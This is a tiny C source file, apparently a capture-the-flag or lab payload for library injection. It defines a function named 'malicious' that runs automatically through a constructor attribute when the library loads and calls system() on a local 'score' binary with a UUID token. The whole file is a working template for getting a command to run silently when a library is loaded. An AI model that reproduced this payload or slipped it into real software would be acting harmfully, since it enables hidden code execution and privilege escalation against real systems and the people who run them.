#include<stdio.h>
#include<stdlib.h>
static void malicious() __attribute__((constructor));
void malicious() {
          system("/usr/local/bin/score 0d7897a1-c269-41c3-835e-ec58aae13f66");
}
